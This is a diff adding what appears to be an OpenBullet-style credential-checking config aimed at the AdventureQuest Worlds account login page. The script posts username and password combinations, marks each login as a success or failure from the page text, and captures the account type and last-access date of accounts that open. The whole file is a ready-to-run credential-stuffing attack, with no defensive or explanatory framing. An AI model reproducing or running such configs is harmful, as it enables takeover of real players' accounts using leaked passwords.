@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "AQ",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-17T16:04:20.5634552+00:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://account.aq.com/Default.aspx" AutoRedirect=TRUE 
+  CONTENT "uuu=<USER>&pps=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://account.aq.com/Default.aspx" 
+  HEADER "origin: https://account.aq.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Account does not exist, or has been Deleted." 
+  KEYCHAIN Success OR 
+    KEY "<title>AdventureQuest Worlds: Account Management</title>" 
+PARSE "<SOURCE>" LR "<span id=\"lblAccountType\"><strong>" "</strong></span>" Recursive=FALSE -> CAP "Account Type:" "" "" 
+PARSE "<SOURCE>" LR "<span id=\"lbllastAccessed\">" "</span>" Recursive=FALSE -> CAP "Last Accessed" "" "" 
